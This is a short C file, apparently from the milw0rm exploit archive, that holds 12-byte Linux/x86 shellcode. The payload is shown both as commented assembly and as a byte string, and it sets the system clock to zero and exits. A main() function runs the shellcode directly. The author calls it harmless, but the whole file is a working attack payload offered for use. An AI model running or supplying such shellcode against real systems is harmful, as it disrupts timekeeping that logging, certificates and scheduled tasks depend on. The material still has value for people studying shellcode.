/* By Kris Katterjohn 11/18/2006
 *
 * 12 byte shellcode to set system time to 0 and exit. No real damage :)
 *
 * exit() code is the last 5 bytes (0x6a - 0x80)
 *
 * for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; stime([0])
 *
 *      push byte 25
 *      pop eax
 *      cdq
 *      push edx
 *      mov ebx, esp
 *      int 0x80
 *
 * ; exit()
 *
 *      inc eax
 *      int 0x80
 */

main()
{
       char shellcode[] = "\x6a\x19\x58\x99\x52\x89\xe3\xcd\x80\x40\xcd\x80";

       (*(void (*)()) shellcode)();
}

// milw0rm.com [2006-11-17]